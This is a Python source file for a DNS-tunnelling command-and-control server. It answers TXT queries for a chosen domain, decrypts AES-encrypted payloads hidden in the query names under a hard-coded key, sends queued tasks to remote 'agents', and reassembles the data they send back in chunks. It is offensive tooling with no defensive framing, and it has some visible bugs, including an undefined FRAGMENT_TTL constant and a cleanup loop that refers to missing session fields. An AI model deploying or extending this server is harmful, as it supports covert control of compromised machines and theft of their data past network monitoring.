import time
import json
import base64
import random
import datetime
import threading

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from dnslib import DNSRecord, QTYPE, RR, TXT
from dnslib.server import DNSServer, BaseResolver

NO_TASK_RESPONSE = "[NOTHING]"
SESSIONS_DATA = "./sessions.json"

SERVER_ADDRESS = "0.0.0.0"
SERVER_PORT = 5353

CLEANUP_INTERVAL = 30
EXPECTED_DOMAIN = "domain.local"

AES_KEY = b"0123456789abcdef"
IV_SIZE=16

NO_TASK_RESPONSE = "[NOTHING]"

def read_json_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            data = json.load(file)
            return data
    except FileNotFoundError:
        print(f"Error: File Not Found: '{file_path}'")
        return None
    except json.JSONDecodeError:
        print(f"Error: Unable to decode JSON File: '{file_path}'.")
        return None

def write_in_json(file_path, data):
    with open(file_path, 'w', encoding='utf-8') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)


def is_json(data: str) -> bool:
    try:
        json.loads(data)
        return True
    except json.JSONDecodeError:
        return False

def b64_encode(data_bytes: bytes):
    return base64.urlsafe_b64encode(data_bytes).rstrip(b"=").decode()

def b64_decode(s: str) -> bytes:
    padding = '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)

def decrypt_data(key: bytes, iv_ct: bytes) -> bytes:
    if len(iv_ct) < 16:
        raise ValueError("iv_ct demasiado corto")
    iv = iv_ct[:16]
    ct = iv_ct[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def encrypt_data(key:bytes, data:bytes):
    encoded_json = json.dumps(data, separators=(",",":"), ensure_ascii=False).encode()
    iv = get_random_bytes(IV_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphered = cipher.encrypt(pad(data, AES.block_size))

    iv_padded = iv+ciphered
    formated_data = b64_encode(iv_padded)

    return formated_data

def encrypt_string(key: bytes, plaintext: str) -> str:

    if not isinstance(plaintext, str):
        raise TypeError("plaintext debe ser string")
    
    data = plaintext.encode("utf-8")
    iv = get_random_bytes(IV_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphered = cipher.encrypt(pad(data, AES.block_size))
    encrypted_blob = iv + ciphered
    return b64_encode(encrypted_blob)

def update_callback(agent_id):
    SESSIONS = read_json_file(SESSIONS_DATA)
    if agent_id not in SESSIONS:
        agent_session = {
            "pending_tasks": [],
            "messages": {},
            "last_time": ''
        }

        SESSIONS[agent_id] = agent_session

    now_dt = datetime.datetime.now()
    now_dt_iso = now_dt.strftime("%Y-%m-%d %H:%M:%S") 

    SESSIONS[agent_id]["last_time"] = now_dt_iso
    write_in_json(SESSIONS_DATA, SESSIONS)

def get_task(agent_id):
    SESSIONS = read_json_file(SESSIONS_DATA)
    pending_tasks = SESSIONS[agent_id]["pending_tasks"]

    if len(pending_tasks) == 0:
        return NO_TASK_RESPONSE

    current_task = pending_tasks[0]
    SESSIONS[agent_id]["pending_tasks"].pop(0)
    write_in_json(SESSIONS_DATA, SESSIONS)


    return current_task

def init_message(agent_id, message_id, task):

    message_data = {
        "task": task,
        "chunks": {},
        "loaded_size": 0,
        "load_size": 0,
        "data": ""
    }

    SESSIONS = read_json_file(SESSIONS_DATA)
    SESSIONS[agent_id]["messages"][message_id] = message_data

    write_in_json(SESSIONS_DATA, SESSIONS)

    return True

def take_callback(agent_id):
    update_callback(agent_id)
    current_task = get_task(agent_id)

    SESSIONS = read_json_file(SESSIONS_DATA)

    formated_response = current_task

    if current_task != NO_TASK_RESPONSE:
        message_id = random.randint(1, 1_000_000)
        formated_response = f"{str(message_id)}:{current_task}"
        init_message(agent_id, message_id, current_task)

    encoded_task = encrypt_string(AES_KEY, formated_response)

    return encoded_task

def assemble_data(message_data):
    chunks = message_data["chunks"]
    sorted_indexes = sorted(chunks.keys(), key=int)
    assembled_b64 = ''.join(chunks[i] for i in sorted_indexes)
    decoded_data = b64_decode(assembled_b64).decode()

    return decoded_data

def take_chunk(data):
    response = encrypt_string(AES_KEY, "[NEXT]")
    SESSIONS = read_json_file(SESSIONS_DATA)
    chunk = json.loads(data)

    agent_id = chunk["agent_id"]
    message_id = str(chunk["message_id"])
    chunk_index = str(chunk["chunk_index"])
    chunk_data = chunk["data"]
    chunk_size = len(chunk_data)

    agent_session = SESSIONS[agent_id]
    message_data = agent_session["messages"][message_id]
    
    if message_data["load_size"] == 0:
        message_data["load_size"] = chunk["size"]

    message_data["chunks"][chunk_index] = chunk_data
    message_data["loaded_size"] = message_data["loaded_size"] + chunk_size

    is_completed = message_data["loaded_size"] == message_data["load_size"]

    if is_completed:
        assembled_data = assemble_data(message_data)
        message_data["data"] = assemble_data(message_data)
        del message_data["chunks"]
        del message_data["loaded_size"]
        del message_data["load_size"]

    agent_session["messages"][message_id] = message_data
    SESSIONS[agent_id] = agent_session

    write_in_json(SESSIONS_DATA, SESSIONS)
    update_callback(agent_id)

    return response

    
def decode_fqdn(head):
    try:
        decoded_head = b64_decode(head)
        decrypted_data = decrypt_data(AES_KEY, decoded_head).decode()
        return decrypted_data
    except Exception as e:
        print(f"[!] Error decoding fqdn head: ", e)
        return None

def handle(head):
    decrypted_data = decode_fqdn(head)
    is_callback = not is_json(decrypted_data)

    response = ""

    if is_callback:
        response = take_callback(decrypted_data)
    else: 
        response = take_chunk(decrypted_data)

    return response

def check_request(qname):
    if not qname.endswith(EXPECTED_DOMAIN):
        return False, ""

    suffix = f".{EXPECTED_DOMAIN}"
    clear_qname = qname.removesuffix(suffix)
    splitted_qname = clear_qname.split(".")
    fqdn = "".join(splitted_qname)

    return True, fqdn

def str_to_chunks(data: str, chunk_size: int = 255) -> list[str]:
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

class DNSResolver(BaseResolver):
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self._stop = False
        self._cleaner = threading.Thread(target=self._cleanup_loop, daemon=True)
        self._cleaner.start()

    def resolve(self, request, handler):
        q = request.q
        qname = str(q.qname).rstrip('.')
        reply = request.reply()

        is_valid_request, fqdn = check_request(qname)

        if not is_valid_request:
            reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(["PONG"])))
            return reply

        raw_response = handle(fqdn)
        chunked_response = str_to_chunks(raw_response)

        reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(chunked_response)))
        return reply

    def _cleanup_loop(self):
        while not self._stop:
            now = time.time()
            with self.lock:
                expired = [sid for sid, sess in self.sessions.items() if now - sess.updated > FRAGMENT_TTL]
                for sid in expired:
                    del self.sessions[sid]
            time.sleep(CLEANUP_INTERVAL)

    def stop(self):
        self._stop = True
        self._cleaner.join(timeout=1)

if __name__ == "__main__":
    resolver = DNSResolver()
    server = DNSServer(resolver, port=SERVER_PORT, address=SERVER_ADDRESS, logger=None)

    server.start_thread()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        resolver.stop()
        server.stop()